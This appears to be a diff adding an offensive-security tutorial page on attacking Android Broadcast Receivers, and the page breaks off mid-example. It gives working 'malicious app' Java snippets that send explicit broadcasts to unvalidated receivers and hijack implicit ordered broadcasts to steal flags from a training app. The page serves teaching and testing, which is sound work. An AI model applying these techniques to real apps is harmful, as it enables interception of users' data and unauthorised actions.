@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>offsecnotes | Broadcast Receivers</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>Broadcast Receivers</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#introduction" id="toc-introduction">Introduction</a>
+<ul>
+<li><a href="#declaring-a-broadcast-receiver" id="toc-declaring-a-broadcast-receiver">Declaring a broadcast receiver</a></li>
+<li><a href="#send-broadcasts" id="toc-send-broadcasts">Send broadcasts</a></li>
+<li><a href="#broadcast-limitations" id="toc-broadcast-limitations">Broadcast limitations</a></li>
+<li><a href="#system-event-broadcasts" id="toc-system-event-broadcasts">System event broadcasts</a></li>
+</ul></li>
+<li><a href="#sending-broadcast-from-malicious-app" id="toc-sending-broadcast-from-malicious-app">Sending broadcast from malicious app</a></li>
+<li><a href="#vulnerabilities" id="toc-vulnerabilities">Vulnerabilities</a>
+<ul>
+<li><a href="#broadcast-redirect" id="toc-broadcast-redirect">Broadcast redirect</a></li>
+<li><a href="#intercept-implicit-intents" id="toc-intercept-implicit-intents">Intercept implicit intents</a></li>
+<li><a href="#control-the-results" id="toc-control-the-results">Control the results</a></li>
+</ul></li>
+</ul></div>
+  <hr>
+<blockquote>
+<p><strong>Note</strong>: this section requires a full understanding of <a href="intent%20attack%20surface.html">Intent attack surface</a>.</p>
+</blockquote>
+<h2 id="introduction">Introduction</h2>
+<p>A <strong><a href="https://developer.android.com/develop/background-work/background-tasks/broadcasts">Broadcast Receiver</a></strong> is a core component that allows your app to listen for system-wide broadcast announcements (called broadcast intents) or broadcasts sent by other applications or even your own application.</p>
+<p>Apps can register to receive specific broadcasts. When a broadcast is sent, the system automatically routes broadcasts to apps that have subscribed to receive that particular type of broadcast.</p>
+<p>Basically, broadcasts can be used as a messaging system across apps and outside of the normal user flow.</p>
+<p>Broadcast Receivers don’t display a user interface. Instead, they respond to broadcasted events by performing some logic. For example: starting a service, showing a notification, logging data, etc.</p>
+<h3 id="declaring-a-broadcast-receiver">Declaring a broadcast receiver</h3>
+<p>You can register a receiver in <strong>two ways</strong>:</p>
+<ol type="1">
+<li><strong>Static Registration</strong> (Manifest)</li>
+</ol>
+<ul>
+<li>The receiver is declared in the <code>AndroidManifest.xml</code> file using the <code>&lt;receiver&gt;</code> tag.</li>
+<li>It can receive broadcasts even when your app is not running (e.g., listening for <code>ACTION_BOOT_COMPLETED</code>).</li>
+</ul>
+<div class="sourceCode" id="cb1"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">receiver</span><span class="ot"> android:name=</span><span class="st">&quot;.MyBootReceiver&quot;</span><span class="ot"> android:exported=</span><span class="st">&quot;true&quot;</span>&gt;</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">action</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.action.BOOT_COMPLETED&quot;</span> /&gt;</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">receiver</span>&gt;</span></code></pre></div>
+<p>The class <code>MyBootReceiver</code> extends <code>BroadcastReceiver</code> and it overrides the <code>onReceive (Context context, Intent intent)</code> method.</p>
+<p>From the attacker perspective this is interesting because the incoming intent is potentially controlled by an attacker.</p>
+<ol start="2" type="1">
+<li><strong>Dynamic Registration</strong> (Runtime)</li>
+</ol>
+<p>Registered at runtime by using <code>registerReceiver()</code> and this works only while the app is running.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>val receiver <span class="op">=</span> <span class="fu">MyReceiver</span><span class="op">()</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>val filter <span class="op">=</span> <span class="fu">IntentFilter</span><span class="op">(</span>Intent<span class="op">.</span><span class="fu">ACTION_BATTERY_LOW</span><span class="op">)</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="fu">registerReceiver</span><span class="op">(</span>receiver<span class="op">,</span> filter<span class="op">)</span></span></code></pre></div>
+<p>In this case, if the system sends this broadcast intent, then the class <code>receiver</code> is used as the receiver and it’ll execute the code in the <code>onReceive()</code> method.</p>
+<blockquote>
+<p><strong>Note</strong>: Dynamically registered receivers used to be <strong>exported by default</strong>: any app could send them an unprotected broadcast, unless they were guarded by a signature permission. Android 13 (API 33) introduced the <code>Context.RECEIVER_EXPORTED</code> and <code>Context.RECEIVER_NOT_EXPORTED</code> flags, and apps targeting Android 14 (API 34) or higher must pass one of them, otherwise <code>registerReceiver()</code> throws a <code>SecurityException</code>. The only exception is a receiver registered exclusively for system broadcasts [<a href="https://developer.android.com/about/versions/14/behavior-changes-14">↗</a>].</p>
+</blockquote>
+<h3 id="send-broadcasts">Send broadcasts</h3>
+<p>Android provides two ways for apps to send broadcasts [<a href="https://developer.android.com/develop/background-work/background-tasks/broadcasts#sending-broadcasts">↗</a>]:</p>
+<ul>
+<li>The <code>sendOrderedBroadcast()</code> method sends broadcasts to one receiver at a time. As each receiver executes in turn, <strong>it can propagate a result to the next receiver</strong>. It can also completely abort the broadcast so that it doesn’t reach other receivers. You can control the order in which receivers run within the same app process. To do so, use the <code>android:priority</code> attribute of the matching <code>intent-filter</code>. Receivers with the same priority are run in an arbitrary order. Since Android 16, priority is only respected within the same process: across different apps the order is no longer guaranteed [<a href="https://developer.android.com/about/versions/16/behavior-changes-all#ordered-broadcast-priority">↗</a>].</li>
+<li>The <code>sendBroadcast()</code> method sends broadcasts to all receivers in an undefined order. This is called a Normal Broadcast. This is more efficient, but means that <strong>receivers cannot read results</strong> from other receivers, propagate data received from the broadcast, or abort the broadcast.</li>
+</ul>
+<h3 id="broadcast-limitations">Broadcast limitations</h3>
+<p>From Android 8 (API level 26), apps can no longer receive implicit broadcasts through receivers declared in their <strong>manifest</strong> [<a href="https://developer.android.com/about/versions/oreo/background#broadcasts">↗</a>]. The system wants to avoid waking up apps that are not even running. So, to reach a manifest-declared receiver, you <strong>have to specify the target</strong> (explicit broadcast).</p>
+<ul>
+<li>This applies to apps targeting API 26 or higher.</li>
+<li><strong>Dynamically registered receivers are not affected</strong>: they still receive implicit broadcasts while the app is running.</li>
+<li>Some broadcasts are <a href="https://developer.android.com/develop/background-work/background-tasks/broadcasts/broadcast-exceptions">exempt</a>, as are broadcasts that require a signature permission.</li>
+</ul>
+<h3 id="system-event-broadcasts">System event broadcasts</h3>
+<p>Android defines many system broadcast actions, such as <code>BOOT_COMPLETED</code> and <code>ACTION_POWER_CONNECTED</code>, declared as <code>&lt;protected-broadcast&gt;</code> in the <a href="https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/res/AndroidManifest.xml">framework manifest</a>. Attempting to send a protected broadcast from a non-system app fails with a <code>SecurityException</code>, for example: <code>Permission Denial: not allowed to send broadcast android.intent.action.ACTION_POWER_CONNECTED from pid=..., uid=...</code>. This restriction applies to both implicit and explicit intents. Even when the target app and receiver class are specified explicitly, the system blocks the broadcast because only the system is allowed to send these actions. As a result, protected broadcast actions cannot be spoofed.</p>
+<p>However, this does not automatically make the receiver safe. Since an attacker cannot set the protected action value, the receiver’s code cannot enter branches that explicitly check for it. If the receiver contains alternative code paths that do not validate the action, those paths may still be reachable through an explicit broadcast with a custom action.</p>
+<p>Malicious app:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>intent<span class="op">.</span><span class="fu">setAction</span><span class="op">(</span><span class="st">&quot;test&quot;</span><span class="op">);</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>intent<span class="op">.</span><span class="fu">setClassName</span><span class="op">(</span><span class="st">&quot;com.app.test&quot;</span><span class="op">,</span> <span class="st">&quot;com.app.test.TestReceiver&quot;</span><span class="op">);</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="fu">sendBroadcast</span><span class="op">(</span>intent<span class="op">);</span></span></code></pre></div>
+<p>Target app:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">receiver</span><span class="ot"> android:name=</span><span class="st">&quot;com.app.test.TestReceiver&quot;</span><span class="ot"> android:exported=</span><span class="st">&quot;true&quot;</span>&gt;</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">action</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.action.ACTION_POWER_CONNECTED&quot;</span>/&gt;</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">receiver</span>&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb5"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="dt">void</span> <span class="fu">onReceive</span><span class="op">(</span><span class="bu">Context</span> context<span class="op">,</span> Intent intent<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>    <span class="bu">String</span> action <span class="op">=</span> intent<span class="op">.</span><span class="fu">getAction</span><span class="op">();</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span><span class="st">&quot;android.intent.action.ACTION_POWER_CONNECTED&quot;</span><span class="op">.</span><span class="fu">equals</span><span class="op">(</span>action<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>        <span class="kw">...</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>        <span class="co">// We can execute this code!</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>In the example above, the if branch is protected because the system action cannot be forged. The else branch, however, is reachable if an explicit intent with a different action is sent, allowing unintended behavior to be triggered.</p>
+<p>The key takeaway is that while protected system broadcasts themselves cannot be forged, BroadcastReceivers that do not strictly validate incoming intents may still expose an attack surface.</p>
+<hr />
+<h2 id="sending-broadcast-from-malicious-app">Sending broadcast from malicious app</h2>
+<p>Let’s say that the app <code>io.hextree.attacksurface</code> has the following <code>BroadcastReceiver</code>:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">receiver</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.receivers.Flag16Receiver&quot;</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:enabled=</span><span class="st">&quot;true&quot;</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span>/&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb7"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag16Receiver <span class="kw">extends</span> BroadcastReceiver <span class="op">{</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="dt">static</span> <span class="bu">String</span> FlagSecret <span class="op">=</span> <span class="st">&quot;give-flag-16&quot;</span><span class="op">;</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="dt">void</span> <span class="fu">onReceive</span><span class="op">(</span><span class="bu">Context</span> context<span class="op">,</span> Intent intent<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>        Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Flag16Receiver.onReceive&quot;</span><span class="op">,</span> Utils<span class="op">.</span><span class="fu">dumpIntent</span><span class="op">(</span>context<span class="op">,</span> intent<span class="op">));</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>intent<span class="op">.</span><span class="fu">getStringExtra</span><span class="op">(</span><span class="st">&quot;flag&quot;</span><span class="op">).</span><span class="fu">equals</span><span class="op">(</span>FlagSecret<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>            <span class="fu">success</span><span class="op">(</span>context<span class="op">,</span> FlagSecret<span class="op">);</span></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="dt">void</span> <span class="fu">success</span><span class="op">(</span><span class="bu">Context</span> context<span class="op">,</span> <span class="bu">String</span> str<span class="op">)</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>You can just send a broadcast as follow:</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>intent<span class="op">.</span><span class="fu">setClassName</span><span class="op">(</span><span class="st">&quot;io.hextree.attacksurface&quot;</span><span class="op">,</span> <span class="st">&quot;io.hextree.attacksurface.receivers.Flag16Receiver&quot;</span><span class="op">);</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>intent<span class="op">.</span><span class="fu">putExtra</span><span class="op">(</span><span class="st">&quot;flag&quot;</span><span class="op">,</span> <span class="st">&quot;give-flag-16&quot;</span><span class="op">);</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="fu">sendBroadcast</span><span class="op">(</span>intent<span class="op">);</span></span></code></pre></div>
+<hr />
+<h2 id="vulnerabilities">Vulnerabilities</h2>
+<h3 id="broadcast-redirect">Broadcast redirect</h3>
+<p>A broadcast redirect occurs when an insecure activity takes an incoming intent, performs some actions/modifications, and then sends the intent via <code>sendBroadcast()</code>. This allows an attacker to control the broadcast intent. For example, this could target internal, non-exported broadcast receivers.</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> ExposedActivity <span class="kw">extends</span> AppCompatActivity <span class="op">{</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span> <span class="op">(</span><span class="kw">...</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">...</span></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a>        Intent intent <span class="op">=</span> <span class="fu">getIntent</span><span class="op">();</span></span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">setClassName</span><span class="op">(</span><span class="st">&quot;com.example.myapp&quot;</span><span class="op">,</span> <span class="st">&quot;com.example.myapp.InternalReceiver&quot;</span><span class="op">);</span></span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a>        <span class="fu">sendBroadcast</span><span class="op">(</span>intent<span class="op">);</span> <span class="co">// This intent could be controlled by the attacker</span></span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>For more information, refer to <a href="intent%20attack%20surface.html#intent-redirect">Intent attack surface - Intent redirect</a>.</p>
+<h3 id="intercept-implicit-intents">Intercept implicit intents</h3>
+<p>This is when an app sends an implicit broadcast, so a malicious app can register a receiver to be a valid target for it.</p>
+<ol type="1">
+<li>Identify an app that sends an implicit broadcast.</li>
+<li>Register a receiver dynamically in your activity. This means your app must be already running.</li>
+</ol>
+<div class="sourceCode" id="cb10"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>BroadcastReceiver receiver <span class="op">=</span> <span class="kw">new</span> <span class="fu">HijackReceiver</span><span class="op">();</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="co">// RECEIVER_EXPORTED: required on Android 14+ to receive broadcasts from other apps</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="fu">registerReceiver</span><span class="op">(</span>receiver<span class="op">,</span> <span class="kw">new</span> <span class="fu">IntentFilter</span><span class="op">(</span><span class="st">&quot;com.example.app.intent.SP_APPS_QUERY_FEEDS&quot;</span><span class="op">),</span> <span class="bu">Context</span><span class="op">.</span><span class="fu">RECEIVER_EXPORTED</span><span class="op">);</span></span></code></pre></div>
+<blockquote>
+<p><strong>Note</strong>: a receiver declared in your <code>AndroidManifest.xml</code> will not receive the implicit broadcast, because of the <a href="#broadcast-limitations">Android 8 limitation</a> described above.</p>
+</blockquote>
+<p><strong>Example</strong></p>
+<p>Let’s say that the app io.hextree.attacksurface has the following activity:</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag18Activity <span class="kw">extends</span> AppCompactActivity <span class="op">{</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="fu">Flag18Activity</span><span class="op">()</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle bundle<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onCreate</span><span class="op">(</span>bundle<span class="op">);</span></span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a>        Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">(</span><span class="st">&quot;io.hextree.broadcast.FREE_FLAG&quot;</span><span class="op">);</span></span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">putExtra</span><span class="op">(</span><span class="st">&quot;flag&quot;</span><span class="op">,</span> <span class="kw">this</span><span class="op">.</span><span class="fu">f182f</span><span class="op">.</span><span class="fu">appendLog</span><span class="op">(</span><span class="kw">this</span><span class="op">.</span><span class="fu">flag</span><span class="op">));</span></span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">addFlags</span><span class="op">(</span><span class="dv">8</span><span class="op">);</span></span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a>        <span class="fu">sendOrderedBroadcast</span><span class="op">(</span>intent<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">new</span> <span class="fu">BroadcastReceiver</span><span class="op">()</span> <span class="op">{</span></span>
+<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a>            <span class="at">@Override</span></span>
+<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a>            <span class="kw">public</span> <span class="dt">void</span> <span class="fu">onReceive</span><span class="op">(</span><span class="bu">Context</span> context<span class="op">,</span> Intent intent2<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a>                <span class="bu">String</span> resultData <span class="op">=</span> <span class="fu">getResultData</span><span class="op">();</span></span>
+<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a>                Bundle resultExtras <span class="op">=</span> <span class="fu">getResultExtras</span><span class="op">(</span><span class="kw">false</span><span class="op">);</span></span>
+<span id="cb11-15"><a href="#cb11-15" aria-hidden="true" tabindex="-1"></a>                <span class="dt">int</span> resultCode <span class="op">=</span> <span class="fu">getResultCode</span><span class="op">();</span></span>
+<span id="cb11-16"><a href="#cb11-16" aria-hidden="true" tabindex="-1"></a>                Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Flag18Activity.BroadcastReceiver&quot;</span><span class="op">,</span> <span class="st">&quot;resultData &quot;</span> <span class="op">+</span> resultData<span class="op">);</span></span>
+<span id="cb11-17"><a href="#cb11-17" aria-hidden="true" tabindex="-1"></a>                Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Flag18Activity.BroadcastReceiver&quot;</span><span class="op">,</span> <span class="st">&quot;resultExtras &quot;</span> <span class="op">+</span> resultExtras<span class="op">);</span></span>
+<span id="cb11-18"><a href="#cb11-18" aria-hidden="true" tabindex="-1"></a>                Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Flag18Activity.BroadcastReceiver&quot;</span><span class="op">,</span> <span class="st">&quot;resultCode &quot;</span> <span class="op">+</span> resultCode<span class="op">);</span></span>
+<span id="cb11-19"><a href="#cb11-19" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">(</span>resultCode <span class="op">!=</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb11-20"><a href="#cb11-20" aria-hidden="true" tabindex="-1"></a>                    flag18Activity<span class="op">.</span><span class="fu">success</span><span class="op">(</span>flag18Activity<span class="op">);</span></span>
+<span id="cb11-21"><a href="#cb11-21" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
+<span id="cb11-22"><a href="#cb11-22" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb11-23"><a href="#cb11-23" aria-hidden="true" tabindex="-1"></a>        <span class="op">},</span> <span class="kw">null</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">);</span></span>
+<span id="cb11-24"><a href="#cb11-24" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb11-25"><a href="#cb11-25" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>To intercept this intent I have to register a receiver and send <code>resultCode != 0</code>:</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a>BroadcastReceiver hijackReceiver <span class="op">=</span> <span class="kw">new</span> <span class="fu">BroadcastReceiver</span><span class="op">()</span> <span class="op">{</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="dt">void</span> <span class="fu">onReceive</span><span class="op">(</span><span class="bu">Context</span> context<span class="op">,</span> Intent intent<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> flag <span class="op">=</span> intent<span class="op">.</span><span class="fu">getStringExtra</span><span class="op">(</span><span class="st">&quot;flag&quot;</span><span class="op">);</span></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>flag <span class="op">!=</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>            Log<span class="op">.</span><span class="fu">d</span><span class="op">(</span><span class="st">&quot;flag&quot;</span><span class="op">,</span> flag<span class="op">);</span></span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a>        <span class="fu">setResultCode</span><span class="op">(</span>RESULT_OK<span class="op">);</span> <span class="co">// Costant value for -1. We add this to trigger success()</span></span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span>
